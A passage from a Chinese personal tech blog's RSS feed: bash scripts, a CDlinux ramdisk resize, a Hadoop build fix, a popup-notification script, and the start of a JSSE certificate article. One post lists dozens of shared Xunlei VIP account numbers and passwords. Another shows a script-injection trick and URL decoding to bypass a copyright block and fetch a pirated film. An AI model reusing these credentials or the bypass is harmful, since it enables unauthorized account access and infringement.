宋体;">|81&nbsp;&nbsp;&nbsp;&nbsp; |82&nbsp;&nbsp;&nbsp;&nbsp; |83&nbsp;&nbsp;&nbsp;&nbsp; |84&nbsp;&nbsp;&nbsp;&nbsp; |85&nbsp;&nbsp;&nbsp;&nbsp; |86&nbsp;&nbsp;&nbsp;&nbsp; |87&nbsp;&nbsp;&nbsp;&nbsp; |88&nbsp;&nbsp;&nbsp;&nbsp; |89&nbsp;&nbsp;&nbsp;&nbsp; |90&nbsp;&nbsp;&nbsp;&nbsp; |</span><br style="font-family: 宋体;"><span style="font-family: 宋体;">|*******|*******|*******|*******|*******|*******|*******|*******|*******|*******|</span><br style="font-family: 宋体;"><span style="font-family: 宋体;">|91&nbsp;&nbsp;&nbsp;&nbsp; |92&nbsp;&nbsp;&nbsp;&nbsp; |93&nbsp;&nbsp;&nbsp;&nbsp; |94&nbsp;&nbsp;&nbsp;&nbsp; |95&nbsp;&nbsp;&nbsp;&nbsp; |96&nbsp;&nbsp;&nbsp;&nbsp; |97&nbsp;&nbsp;&nbsp;&nbsp; |98&nbsp;&nbsp;&nbsp;&nbsp; |99&nbsp;&nbsp;&nbsp;&nbsp; |100&nbsp;&nbsp;&nbsp; |</span><br style="font-family: 宋体;"><span style="font-family: 宋体;">|*******|*******|*******|*******|*******|*******|*******|*******|*******|*******|</span><br style="font-family: 宋体;"><br>脚本代码：163什么时候能支持co<wbr>de标签呢？<br><span style="font-family: 宋体;">#!/bin/bash<br>
for((i=1;i&lt;=100;i++)) do<br>
&nbsp;&nbsp;&nbsp; echo -n -e "|$i\t"<br>
&nbsp;&nbsp;&nbsp; if [ $((i%10)) -eq 0 ]; then<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo -e '|'<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for((j=0;j&lt;10;j++)) do<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo -n '|'<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for((k=0;k&lt;7;k++)) do<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo -n '*'<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; done<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; done<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo '|'<br>
<br>
&nbsp;&nbsp;&nbsp; fi<br>
done<br>
</span><br style="font-family: 宋体;">]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720098285479179/</guid>
    </item>
    <item>
      <title>
<![CDATA[给CDlinux的Ramdisk扩容]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200941332534469/</link>
      <description>
<![CDATA[CDlinux0.4.9的Ramdisk只有12M，稍微放几个扩展包进去就磁盘空间不足了，所以把它扩成了30M的。<br>首先在Ubuntu上制作Ramdisk(也可以直接在CDlinux上制作），然后从CDlinux上使用wget把做好的Ramdisk下载下来，并替换掉旧得CDlinux.gz<br>这里有一个做好得Ramdisk，可以直接<a target="_blank" rel="nofollow" href="http://dl.getdropbox.com/u/194885/CDlinux.gz"  >下载</a><br><br>1. 在Ubuntu上制作Ramdisk<br>#挂载旧的Ramdisk<br>gunzip CDlinux.gz<br>mv CDlinux CDlinux.old<br>sudo mount -o loop CDlinux.old /mnt/cd<br>#创建新的Ramdisk<br>sudo dd if=/dev/zero of=CDlinux bs=1k count=30720<br>sudo mke2fs -F -v -m0 CDlinux<br>sudo mount -o loop CDlinux /mnt/ram<br>#把文件从旧系统复制到新系统中<br>sudo cp&nbsp; -av /mnt/cd/* /mnt/ram/<br>#卸载文件并压缩<br>sudo umount /mnt/ram<br>gzip CDlinux<br><br>2. 然后从CDlinux上用wget命令获取制作好得CDlinuxgz<br>#挂载文件系统<br>mount /dev/hda1 /mnt<br>cd /mnt/CDlinux<br>#保存旧得Ramdisk，新做得ramdisk失败了还可以用旧的Ramdisk启动<br>cp CDlinux.gz CDlinux.gz.old<br>wget &lt;共享目录&gt;/CDlinux.gz<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200941332534469/</guid>
    </item>
    <item>
      <title>
<![CDATA[Hadoop源码之路二：编译Hadoop]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720131114774115/</link>
      <description>
<![CDATA[1. 准备环境<wbr><div>1.1 安装maven sudo apt-get install maven</div><div>1.2 安装protobuf sudo apt-get install libprotobuf-dev</div><div>1.3 下载代码&nbsp;</div><div><span style="color: rgb(75, 78, 81); font-family: 'Hiragino Sans GB W3', 'Hiragino Sans GB', Arial, Helvetica, simsun, u5b8bu4f53; line-height: 28px;"   >wget http://mirror.esocc.com/apache/hadoop/core/stable2/hadoop-2.2.0-src.tar.gz</span></div><div><span style="color: rgb(75, 78, 81); font-family: 'Hiragino Sans GB W3', 'Hiragino Sans GB', Arial, Helvetica, simsun, u5b8bu4f53; line-height: 28px;"   >tar xf hadoop-2.2.0-src.tar.gz</span></div><div><span style="color: rgb(75, 78, 81); font-family: 'Hiragino Sans GB W3', 'Hiragino Sans GB', Arial, Helvetica, simsun, u5b8bu4f53; line-height: 28px;"   >mv hadoop-2.2.0-src hadoop</span></div><div><span style="color: rgb(75, 78, 81); font-family: 'Hiragino Sans GB W3', 'Hiragino Sans GB', Arial, Helvetica, simsun, u5b8bu4f53; line-height: 28px;"   >cd hadoop</span></div><div><span style="color: rgb(75, 78, 81); font-family: 'Hiragino Sans GB W3', 'Hiragino Sans GB', Arial, Helvetica, simsun, u5b8bu4f53; line-height: 28px;"   >2. 编译</span></div><div><font color="#4b4e51"   face="Hiragino Sans GB W3, Hiragino Sans GB, Arial, Helvetica, simsun, u5b8bu4f53"   >mvn package -Pdist -DskipTests -Dtar</font></div><div><font color="#4b4e51"   face="Hiragino Sans GB W3, Hiragino Sans GB, Arial, Helvetica, simsun, u5b8bu4f53"   >编译出错时，需要修改：</font></div><div><span style="font-family: Simsun; line-height: 24px;"   >+++ hadoop-common-project/hadoop-auth/pom.xml	(working copy)</span><br style="font-family: Simsun; line-height: 24px;"   ><span style="font-family: Simsun; line-height: 24px;"   >@@ -54,6 +54,11 @@</span><br style="font-family: Simsun; line-height: 24px;"   ><span style="font-family: Simsun; line-height: 24px;"   >&nbsp;&nbsp;&nbsp;&nbsp; &lt;/dependency&gt;</span><br style="font-family: Simsun; line-height: 24px;"   ><span style="font-family: Simsun; line-height: 24px;"   >&nbsp;&nbsp;&nbsp;&nbsp; &lt;dependency&gt;</span><br style="font-family: Simsun; line-height: 24px;"   ><span style="font-family: Simsun; line-height: 24px;"   >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;groupId&gt;org.mortbay.jetty&lt;/groupId&gt;</span><br style="font-family: Simsun; line-height: 24px;"   ><span style="font-family: Simsun; line-height: 24px;"   >+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;artifactId&gt;jetty-util&lt;/artifactId&gt;</span><br style="font-family: Simsun; line-height: 24px;"   ><span style="font-family: Simsun; line-height: 24px;"   >+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;scope&gt;test&lt;/scope&gt;</span><br style="font-family: Simsun; line-height: 24px;"   ><span style="font-family: Simsun; line-height: 24px;"   >+&nbsp;&nbsp;&nbsp; &lt;/dependency&gt;</span><br style="font-family: Simsun; line-height: 24px;"   ><span style="font-family: Simsun; line-height: 24px;"   >+&nbsp;&nbsp;&nbsp; &lt;dependency&gt;</span><br style="font-family: Simsun; line-height: 24px;"   ><span style="font-family: Simsun; line-height: 24px;"   >+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;groupId&gt;org.mortbay.jetty&lt;/groupId&gt;</span><br style="font-family: Simsun; line-height: 24px;"   ><span style="font-family: Simsun; line-height: 24px;"   >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;artifactId&gt;jetty&lt;/artifactId&gt;</span><br style="font-family: Simsun; line-height: 24px;"   ><span style="font-family: Simsun; line-height: 24px;"   >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;scope&gt;test&lt;/scope&gt;</span></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720131114774115/</guid>
    </item>
    <item>
      <title>
<![CDATA[免费迅雷VIP帐号]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201011149588290/</link>
      <description>
<![CDATA[竟然真的能用，不过好像本月流量都用完了，月初用吧<br><wbr>账号341611113密码www.haiyou5.com<br>账号338308586密码www.haiyou5.com<br>账号338930669密码www.haiyou5.com<br>账号341536852密码www.haiyou5.com<br>账号341789858密码www.haiyou5.com<br>账号343118758密码www.haiyou5.com<br>账号343087952密码www.haiyou5.com<br>账号343756223密码www.haiyou5.com<br>账号349651033密码www.haiyou5.com<br>账号338276813密码www.haiyou5.com<br>账号335899258密码www.haiyou5.com<br>账号328810880密码www.haiyou5.com<br>账号326089168密码www.haiyou5.com<br>账号324524318密码www.haiyou5.com<br>账号313062878密码www.haiyou5.com<br>账号305391816密码www.haiyou5.com<br>账号318796448密码www.haiyou5.com<br>账号316591808密码www.haiyou5.com<br>账号312876988密码www.haiyou5.com<br>账号316291038密码www.haiyou5.com<br>账号322484258密码www.haiyou5.com<br>账号265572802密码www.haiyou5.com<br>账号267369601密码www.haiyou5.com<br>账号298360835密码www.haiyou5.com<br>账号319339185密码www.haiyou5.com<br>账号322997158密码www.haiyou5.com<br>账号311335257密码www.haiyou5.com<br>账号350628673密码xinjipin.com<br>账号352285567密码xinjipin.com<br>账号352513128密码xinjipin.com<br>账号349833182密码xinjipin.com<br>账号350607048密码xinjipin.com<br>账号350699655密码xinjipin.com<br>账号349114548密码xinjipin.com<br>账号349300585密码xinjipin.com<br>账号288947077密码xinjipin.com<br>账号331531799密码xinjipin.com<br>账号346327456密码www.xinjipin.com<br>账号329160070密码xinjipin.com<br>账号336080377密码xinjipin<br>账号341420117密码xinjipin.com<br>账号341448234密码xinjipin.com<br>账号329142109密码xinjipin<br>账号332895737密码xinjipin<br>账号329142109密码xinjipin<br>账号331455360密码xinjipin.com<br>账号331582097密码www.xinjipin.com<br>账号325126116密码www.xinjipin.com<br>账号329216877密码xinjipin.cn<br>账号329523687密码xinjipin.cn<br>账号329555789密码xinjipin.cn<br>账号327479533密码xinjipin<br>账号326036099密码xinjipin.com<br>账号219335641密码yangshen.org<br>账号326028788密码www.xinjipin.com<br>账号323910168密码123444<br>账号219359132密码888555<br>账号312655027密码xinjipin.com<br>账号288984228密码xinjipin.com<br>账号161248034密码www.xinjipin.com<br>账号317714500密码www.xinjipin.com<br>账号280256977密码www.xinjipin.com<br>账号219358357密码www.xinjipin.com<br>账号221250065密码www.xinjipin.com<br>账号219335225密码www.xinjipin.com<br>账号219359035密码www.xinjipin.com<br>账号165004487密码www.xinjipin.com<br>账号288952595密码www.xinjipin.com<br>账号313002004密码www.xinjipin.com<br>账号289029986密码www.xinjipin.com<br>账号288964366密码www.xinjipin.com<br>账号288970539密码www.xinjipin.com<br>账号288972588密码www.xinjipin.com<br>账号288974778密码www.xinjipin.com<br>账号289027044密码www.xinjipin.com<br>账号289028439密码www.xinjipin.com<br>账号288978028密码www.xinjipin.com]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201011149588290/</guid>
    </item>
    <item>
      <title>
<![CDATA[夜读源码]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200782782441697/</link>
      <description>
<![CDATA[<P>N久以前就像读点源代码了，一直没有坚持下去，往往读上两三行就搁浅了。</P>
<P>最近心神不宁，读个短的，几十K的</P>
<P>jisp2.5.1</P>
<P>简介：</P>
<P>感觉好像是一个文件数据库，还没读完。好像和以前用C++写的一个Xml数据库的思路基本一致，当时也是用的树。不过这个好像用到了霍夫曼。</P>
<P>&nbsp;</P>
<P>可惜代码写的实在不怎么样，注释也很差，代码结构更差，全在一个包里。而且源代码竟然不能直接编译，enum关键字，还缺少一个类，测试类竟然有一个和类库里基本类同。不过类很少，很适合初读者。截个图：</P>
<P>&nbsp;<A href="http://img.blog.163.com/photo/qvoekYRikirJuJ_RDzhGUg==/3969360121573874997.jpg" target=_blank><IMG src="http://img.blog.163.com/photo/qvoekYRikirJuJ_RDzhGUg==/3969360121573874997.jpg"></A></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200782782441697/</guid>
    </item>
    <item>
      <title>
<![CDATA[bash的寂寞2]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200982873428671/</link>
      <description>
<![CDATA[bash毕竟不是用来做计算的，试着用bash写个求阶乘和正弦函数的方法，竟然颇为难<br>正弦函数精确度不够，计算出来的结果基本没用<br>阶乘只能算到20！<br>#!/bin/bash<br>function nx # calculate n!<br>{<br>&nbsp;&nbsp;&nbsp; if [ "$1" = '' ]; then<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo 'Usage: nx &lt;n&gt;'<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit 1<br>&nbsp;&nbsp;&nbsp; elif [ $1 -gt 20 ]; then #can not calcuate when n&gt;20<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo 'Too large'<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit 1<br>&nbsp;&nbsp;&nbsp; fi<br>&nbsp;&nbsp;&nbsp; total=1<br>&nbsp;&nbsp;&nbsp; for((i=1;i&lt;=$1;i++))<br>&nbsp;&nbsp;&nbsp; do<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; total=$(($total*$i))<br>&nbsp;&nbsp;&nbsp; done<br>&nbsp;&nbsp;&nbsp; echo "$1!=$total"<br>}<br>function sin # calculate sin(x)<br>{<br>&nbsp;&nbsp;&nbsp; if [ '$1' = '' ]; then<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo 'Usage: sin &lt;x&gt;'<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit 1<br>&nbsp;&nbsp;&nbsp; fi<br>&nbsp;&nbsp;&nbsp; x=$1<br>&nbsp;&nbsp;&nbsp; px=`awk -v x=$1 'BEGIN {printf "%.8f",x*x/2}'`<br>&nbsp;&nbsp;&nbsp; total=$x<br>&nbsp;&nbsp;&nbsp; for((i=3;i&lt;80;i++))<br>&nbsp;&nbsp;&nbsp; do<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; px=`awk -v p=$px -v x=$x -v i=$i 'BEGIN {print -p*x/i}'`<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; total=`awk -v t=$total -v s=$px -v x=$x -v i=$i 'BEGIN {print t+s*x/i}'`<br>&nbsp;&nbsp;&nbsp; done<br>&nbsp;&nbsp;&nbsp; echo $total<br>}<br>nx&nbsp; 8<br>sin 0.5<br>nx<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200982873428671/</guid>
    </item>
    <item>
      <title>
<![CDATA[修改BIOS导致不能识别网卡]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010423111217923/</link>
      <description>
<![CDATA[N破的主板，竟然没有PXE启动选项，打开BIOS乱改一通，还是不支持，然后意外的发现，网络连接的网卡不见了。网卡还在亮，就是识别不出来，杯具！<br>恢复BIOS默认设置，还是不行，杯具！<br>最后师兄用BIOS放电的方式解决，囧啊！破主板]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010423111217923/</guid>
    </item>
    <item>
      <title>
<![CDATA[类似MSN提示的页面效果[转]]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372007111174625632/</link>
      <description>
<![CDATA[&lt;html&gt;<BR>&lt;head&gt;<BR>&lt;title&gt;类似MSN提示的页面效果&lt;/title&gt;<BR>&lt;/head&gt;<BR>&lt;body scroll=no&gt;<BR>看到右下角的提示了吗？如果没有看到，&lt;button onclick=location.reload();&gt;刷新&lt;/button&gt;一下<BR>&lt;script language="JavaScript"&gt;<BR>window.onload = getMsg;<BR>window.onresize = resizeDiv;<BR>window.onerror = function(){}<BR>//短信提示使用(asilas添加)<BR>var divTop,divLeft,divWidth,divHeight,docHeight,docWidth,objTimer,i = 0;<BR>function getMsg()<BR>{<BR>&nbsp;try{<BR>&nbsp;divTop = parseInt(document.getElementById("eMeng").style.top,10)<BR>&nbsp;divLeft = parseInt(document.getElementById("eMeng").style.left,10)<BR>&nbsp;divHeight = parseInt(document.getElementById("eMeng").offsetHeight,10)<BR>&nbsp;divWidth = parseInt(document.getElementById("eMeng").offsetWidth,10)<BR>&nbsp;docWidth = document.body.clientWidth;<BR>&nbsp;docHeight = document.body.clientHeight;<BR>&nbsp;document.getElementById("eMeng").style.top = parseInt(document.body.scrollTop,10) + docHeight + 10;//&nbsp; divHeight<BR>&nbsp;document.getElementById("eMeng").style.left = parseInt(document.body.scrollLeft,10) + docWidth - divWidth<BR>&nbsp;document.getElementById("eMeng").style.visibility="visible"<BR>&nbsp;objTimer = window.setInterval("moveDiv()",10)<BR>&nbsp;}<BR>&nbsp;catch(e){}<BR>}<BR>function resizeDiv()<BR>{<BR>&nbsp;i+=1<BR>&nbsp;if(i&gt;500) closeDiv()<BR>&nbsp;try{<BR>&nbsp;divHeight = parseInt(document.getElementById("eMeng").offsetHeight,10)<BR>&nbsp;divWidth = parseInt(document.getElementById("eMeng").offsetWidth,10)<BR>&nbsp;docWidth = document.body.clientWidth;<BR>&nbsp;docHeight = document.body.clientHeight;<BR>&nbsp;document.getElementById("eMeng").style.top = docHeight - divHeight + parseInt(document.body.scrollTop,10)<BR>&nbsp;document.getElementById("eMeng").style.left = docWidth - divWidth + parseInt(document.body.scrollLeft,10)<BR>&nbsp;}<BR>&nbsp;catch(e){}<BR>}<BR>function moveDiv()<BR>{<BR>&nbsp;try<BR>&nbsp;{<BR>&nbsp;if(parseInt(document.getElementById("eMeng").style.top,10) &lt;= (docHeight - divHeight + parseInt(document.body.scrollTop,10)))<BR>&nbsp;{<BR>&nbsp;window.clearInterval(objTimer)<BR>&nbsp;objTimer = window.setInterval("resizeDiv()",1)<BR>&nbsp;}<BR>&nbsp;divTop = parseInt(document.getElementById("eMeng").style.top,10)<BR>&nbsp;document.getElementById("eMeng").style.top = divTop - 1<BR>&nbsp;}<BR>&nbsp;catch(e){}<BR>}<BR>function closeDiv()<BR>{<BR>&nbsp;document.getElementById('eMeng').style.visibility='hidden';<BR>&nbsp;if(objTimer) window.clearInterval(objTimer)<BR>}<BR>&lt;/script&gt;<BR>&lt;DIV id=eMeng style="BORDER-RIGHT: #455690 1px solid; BORDER-TOP: #a6b4cf 1px solid; Z-INDEX:99999; LEFT: 0px; VISIBILITY: hidden; BORDER-LEFT: #a6b4cf 1px solid; WIDTH: 180px; BORDER-BOTTOM: #455690 1px solid; POSITION: absolute; TOP: 0px; HEIGHT: 116px; BACKGROUND-COLOR: #c9d3f3"&gt;<BR>&lt;TABLE style="BORDER-TOP: #ffffff 1px solid; BORDER-LEFT: #ffffff 1px solid" cellSpacing=0 cellPadding=0 width="100%" bgColor=#cfdef4 border=0&gt;<BR>&lt;TBODY&gt;<BR>&lt;TR&gt;<BR>&lt;TD style="FONT-SIZE: 12px; BACKGROUND-IMAGE: url(msgTopBg.gif); COLOR: #0f2c8c" width=30 height=24&gt;&lt;/TD&gt;<BR>&lt;TD style="FONT-WEIGHT: normal; FONT-SIZE: 12px; BACKGROUND-IMAGE: url(msgTopBg.gif); COLOR: #1f336b; PADDING-TOP: 4px;PADDING-left: 4px" valign=middle width="100%"&gt; 短消息提示：&lt;/TD&gt;<BR>&lt;TD style="BACKGROUND-IMAGE: url(msgTopBg.gif); PADDING-TOP: 2px;PADDING-right:2px" valign=middle align=right width=19&gt;&lt;span title=关闭 style="CURSOR: hand;color:red;font-size:12px;font-weight:bold;margin-right:4px;" onclick=closeDiv() &gt;×&lt;/span&gt;&lt;!-- &lt;img src="msgClose.jpg" onclick="javascript:window.open(this.src);" style="CURSOR: pointer" onload="return imgzoom(this,550)"&nbsp; alt="" /&gt; --&gt;&lt;/TD&gt;<BR>&lt;/TR&gt;<BR>&lt;TR&gt;<BR>&lt;TD style="PADDING-RIGHT: 1px; BACKGROUND-IMAGE: url(1msgBottomBg.jpg); PADDING-BOTTOM: 1px" colSpan=3 height=90&gt;<BR>&lt;DIV style="BORDER-RIGHT: #b9c9ef 1px solid; PADDING-RIGHT: 13px; BORDER-TOP: #728eb8 1px solid; PADDING-LEFT: 13px; FONT-SIZE: 12px; PADDING-BOTTOM: 13px; BORDER-LEFT: #728eb8 1px solid; WIDTH: 100%; COLOR: #1f336b; PADDING-TOP: 18px; BORDER-BOTTOM: #b9c9ef 1px solid; HEIGHT: 100%"&gt;您有&lt;font color=#FF0000&gt;1封新短消息&lt;BR&gt;&lt;BR&gt;<BR>&lt;DIV align=center style="word-break:break-all"&gt;&lt;a href="javascript:alert('你好')"&gt;&lt;font color=#FF0000&gt;点击查看短信&lt;/a&gt;&lt;/DIV<BR>&lt;/DIV&gt;<BR>&lt;/TD&gt;<BR>&lt;/TR&gt;<BR>&lt;/TBODY&gt;<BR>&lt;/TABLE&gt;<BR>&lt;/DIV&gt;<BR>&lt;/body&gt;<BR>&lt;/html&gt;<BR>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372007111174625632/</guid>
    </item>
    <item>
      <title>
<![CDATA[狗狗已屏蔽其下载-迅雷的太极]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010112735245876/</link>
      <description>
<![CDATA[http://down.gougou.com/down?cid=235D89B735A012AE295F7071147D106ECF38D76D<br><span style="color: rgb(197, 40, 40);" id="camefrom">该资源为版权方声明保护内容，狗狗已屏蔽其下载<br></span><pre id="line13">怎么办？难道真的无法下载了吗？其实迅雷只是打个幌子而已，还是可以下载的，至少有三种办法：<br>第一个办法是去百度或者谷歌搜索关键字和thunder，例如这里使用关键字：“让子弹飞 thunder”<br>http://www.baidu.com/s?wd=让子弹飞+thunder<br>就能找到这种thunder://格式的地址了，放到迅雷里就能用了<br>thunder://QUFmdHA6Ly8xMjE5OjEyMTlAZnRwLmZmZHkuY2M6MjA1MTIv0N7V/dbcyPO3oiC9qs7EILjw08WzrLrAu6q+3tDH1fPI3bav1/e+3tbGobbIw9fTta+3yaG3ufrT70RWRNbQ19Yucm12Ylpa<br><br>第二个办法是使用IE执行javascript<br>引用【通过IE的脚本注入方式可以破解，首先必须用ie打开，找到要下载的资源，然后在地址栏输入：
javascript:g_res_status=0;initPage();
回车后，屏幕会闪一下，这时候按钮虽然还是灰的，但已经可以点了。】，在FireFox中用Firebug应该也可以<br><br>第三个办法就是查看源代码，下载链接其实藏在源代码时。右键“查看源代码”，找到这样的一行java script语句：<br>var g_downUrlList=["%68%74%74%70%3a%2f%2f%62%61%6b%2e%68%6f%74%31%32%2e%31%31%35%63%64%6e%2e%63%6f%6d%2f%70%69%63%6b%64%6f%77%6e%2f%36%38%31%61%65%65%62%61%33%61%30%36%62%36%30%66%35%37%35%66%33%37%61%33%61%64%66%64%37%37%38%30%34%64%30%64%66%32%32%32%2f%4d%30%30%2f%30%30%2f%37%45%2f%63%57%6d%75%65%30%30%4e%78%70%67%41%41%41%41%41%49%31%7a%64%5a%53%54%58%4a%73%6b%32%34%33%38%33%35%30%2f%25%45%33%25%38%30%25%39%30%25%45%39%25%41%42%25%39%38%25%45%36%25%42%38%25%38%35%25%45%35%25%39%43%25%41%38%25%45%37%25%42%41%25%42%46%51%56%4f%44%2e%33%49%38%49%2e%4e%45%54%25%45%33%25%38%30%25%39%31%25%45%38%25%41%45%25%41%39%25%45%35%25%41%44%25%39%30%25%45%35%25%42%43%25%42%39%25%45%39%25%41%33%25%39%45%44%56%44%2e%72%6d%76%62%3f%66%69%6c%65%3d%25%45%33%25%38%30%25%39%30%25%45%39%25%41%42"];<span style="font-family: Arial,Helvetica,Sans-Serif;"><br>这个url就是下载链接。<br>解码也很简单，或者去找个urldecode的网站，例如<br>或者使用python的urllib.unquote方法，如下所示</span><br></pre><wbr>hankjin@jnfdaj:~$ python<br>Python 2.5.2 (r252:60911, Jan 20 2010, 23:16:55)<br>[GCC 4.3.2] on linux2<br>Type "help", "copyright", "credits" or "license" for more information.<br>&gt;&gt;&gt; import urllib<br>&gt;&gt;&gt; urllib.unquote(“%68%74%74%70%3a%2f%2f%62%61%6b%2e%68%6f%74%31%32%2e%31%31%35%63%64%6e%2e%63%6f%6d%2f%70%69%63%6b%64%6f%77%6e%2f%36%38%31%61%65%65%62%61%33%61%30%36%62%36%30%66%35%37%35%66%33%37%61%33%61%64%66%64%37%37%38%30%34%64%30%64%66%32%32%32%2f%4d%30%30%2f%30%30%2f%37%45%2f%63%57%6d%75%65%30%30%4e%78%70%67%41%41%41%41%41%49%31%7a%64%5a%53%54%58%4a%73%6b%32%34%33%38%33%35%30%2f%25%45%33%25%38%30%25%39%30%25%45%39%25%41%42%25%39%38%25%45%36%25%42%38%25%38%35%25%45%35%25%39%43%25%41%38%25%45%37%25%42%41%25%42%46%51%56%4f%44%2e%33%49%38%49%2e%4e%45%54%25%45%33%25%38%30%25%39%31%25%45%38%25%41%45%25%41%39%25%45%35%25%41%44%25%39%30%25%45%35%25%42%43%25%42%39%25%45%39%25%41%33%25%39%45%44%56%44%2e%72%6d%76%62%3f%66%69%6c%65%3d%25%45%33%25%38%30%25%39%30%25%45%39%25%41%42”)<br>'http://bak.hot12.115cdn.com/pickdown/681aeeba3a06b60f575f37a3adfd77804d0df222/M00/00/7E/cWmue00NxpgAAAAAI1zdZSTXJsk2438350/%E3%80%90%E9%AB%98%E6%B8%85%E5%9C%A8%E7%BA%BFQVOD.3I8I.NET%E3%80%91%E8%AE%A9%E5%AD%90%E5%BC%B9%E9%A3%9EDVD.rmvb?file=%E3%80%90%E9%AB'<br>&gt;&gt;&gt;<br>拿到下载地址了：<br>http://bak.hot12.115cdn.com/pickdown/681aeeba3a06b60f575f37a3adfd77804d0df222/M00/00/7E/cWmue00NxpgAAAAAI1zdZSTXJsk2438350/%E3%80%90%E9%AB%98%E6%B8%85%E5%9C%A8%E7%BA%BFQVOD.3I8I.NET%E3%80%91%E8%AE%A9%E5%AD%90%E5%BC%B9%E9%A3%9EDVD.rmvb?file=%E3%80%90%E9%AB<br>放到迅雷里就可以了]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010112735245876/</guid>
    </item>
    <item>
      <title>
<![CDATA[JSSE访问带有未验证证书的HTTPS[转]]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372007101733117197/</link>
      <description>
<![CDATA[<P><FONT color="#000000" >　　<STRONG>摘 要</STRONG>&nbsp; JSSE是一个SSL和TLS的纯<NOBR style="COLOR: #6600ff; BORDER-BOTTOM: #6600ff 1px dotted; BACKGROUND-COLOR: transparent; TEXT-DECORATION: underline;"  target="_blank"  this kwC false>Java</NOBR>实现，通过JSSE可以很容易地编程实现对HTTPS站点的访问。但是，如果该站点的证书未经权威机构的验证，JSSE将拒绝信任该证书从而不能访问HTTPS站点。本文在简要介绍JSSE的基础上提出了两种解决该问题的方法。<BR><BR>　　<STRONG>引言<BR><BR></STRONG>　　过去的十几年，网络上已经积累了大量的Web应用。如今，无论是整合原有的Web应用系统，还是进行新的Web<NOBR style="COLOR: #6600ff; BORDER-BOTTOM: #6600ff 1px dotted; BACKGROUND-COLOR: transparent; TEXT-DECORATION: underline;"  target="_blank"  this kwC false>开发</NOBR>，都要求通过编程来访问某些Web页面。传统的方法是使用Socket接口，但现在很多开发平台或工具如.NET、Java或PHP等都提供了简单的Web访问接口，使用这些接口很容易编程实现与Web应用系统的交互访问，即使要访问那些采用了HTTPS而不是HTTP的Web应用系统。<BR><BR>　　HTTPS，即安全的超文本传输协议，采用了SSL技术，被广泛使用以保证Web应用系统的安全性。访问Web应用的编程接口大多封装了SSL，使得访问HTTPS和访问HTTP一样简单。但是很多中、小型应用系统或基于局域网、校园网的应用系统所使用的证书并不是由权威的<NOBR style="COLOR: #6600ff; BORDER-BOTTOM: #6600ff 1px dotted; BACKGROUND-COLOR: transparent; TEXT-DECORATION: underline;"  target="_blank"  this kwC false>认证</NOBR>机构发行或者被其验证，直接使用这些编程接口将不能访问HTTPS。<BR><BR>　　